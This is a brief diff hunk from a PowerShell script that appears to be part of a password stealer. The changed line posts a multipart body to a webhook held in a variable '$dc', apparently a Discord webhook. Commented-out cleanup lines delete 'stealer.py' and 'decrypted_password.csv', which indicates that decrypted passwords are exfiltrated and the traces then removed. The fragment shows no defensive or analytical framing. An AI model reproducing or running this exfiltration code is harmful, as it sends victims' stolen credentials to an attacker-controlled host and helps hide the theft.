@@ -37,7 +37,7 @@ $headers = @{
     "Content-Type" = "multipart/form-data; boundary=$boundary"
 }
 
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
+Invoke-RestMethod -Uri $dc -Method Post -Headers $headers -Body $body
 
 #Remove-Item stealer.py -Force
 #Remove-item decrypted_password.csv -Force
